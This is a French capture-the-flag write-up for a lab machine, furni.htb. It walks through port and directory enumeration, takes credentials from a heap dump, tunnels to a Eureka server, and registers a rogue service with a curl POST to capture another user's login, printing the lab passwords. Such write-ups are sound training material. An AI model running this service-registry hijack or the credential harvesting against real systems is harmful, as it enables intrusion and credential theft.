Difficulté : Hard

# Enumeration 
## Nmap 
Nous commençons par exécuter une analyse nmap sur la cible : 

![[Pasted image 20250429111659.png]]
Le scan révèle que les ports **22**, **80** et **8761** sont ouverts sur la cible.

En explorant le port **80**, nous avons découvert un site web accessible à l'adresse **furni.htb**.

![[Pasted image 20250429112028.png]]

Afin d’identifier d’éventuelles ressources non listées accessibles sur le serveur web de la cible `http://furni.htb`, un fuzzing de répertoires a été réalisé à l’aide de l’outil `ffuf`. 

```
ffuf  -u http://furni.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
```

ca m'a permis d’identifier plusieurs sous-domaines associés à la cible. Ces sous-domaines peuvent héberger des fichiers , dossiers ou applications supplémentaires potentiellement intéressante  à la suite de l’analyse.

![[Pasted image 20250429114201.png]]

Après avoir téléchargé l'ensemble des fichiers disponibles et entamé leur analyse un par un, j'ai identifié un fichier nommé **`headpdump`**. En examinant son contenu, j'ai recherché la présence éventuelle d'informations sensibles telles que des identifiants ou des mots de passe. Cette inspection m’a permis de mettre en évidence des données potentiellement intéressantes.

![[Pasted image 20250429115759.png]]

password=0sc@r190_S0l!dP@sswd, user=oscar190

http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!


![[Pasted image 20250429122014.png]]

Oscar parvient à se connecter via SSH, mais j'ai également repéré le service **Eureka**. Afin d'y accéder, je vais configurer une redirection de port pour pouvoir me connecter au port **8761**

```
ssh -L 8761:localhost:8761 oscar190@10.10.11.66
```

Les identifiants récupérés seront testés sur l’ensemble des interfaces de connexion identifiées précédemment.
login: EurekaSrvr
password: 0scarPWDisTheB3st

![[Pasted image 20250429122335.png]]

Nous allons déployer un service factice basé sur l’exemple "Hacking Netflix Eureka", dans le but de simuler une présence légitime au sein de l’environnement et d’exploiter la confiance accordée aux services enregistrés.

```
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H 'Content-Type: application/json' -d '{
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "YOURIP",  
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "YOURIP",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": { "$": 8081, "@enabled": "true" },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}'
```



![[Pasted image 20250429131113.png]]

nous avons réussi à extraire le nom d'utilisateur et le mot de passe associés au service ciblé, ce qui permet une élévation des privilèges ou un accès non autorisé aux ressources internes.

```
username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=JIVbCzoWJkTBdEsVTbZrxfWiTajQj9Lg9FvXWFIcckIGJ5AuQOM_aFknH3DsRigsLJtf88DBYMm1vefNwG7vYGd-SyA1QqhP 
```

![[Pasted image 20250429132310.png]]
 password : IL!veT0Be&BeT0L0ve
 
![[Pasted image 20250429132432.png]]

![[Pasted image 20250429133417.png]]


![[Pasted image 20250429133338.png]]

https://gchq.github.io/CyberChef/
https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka
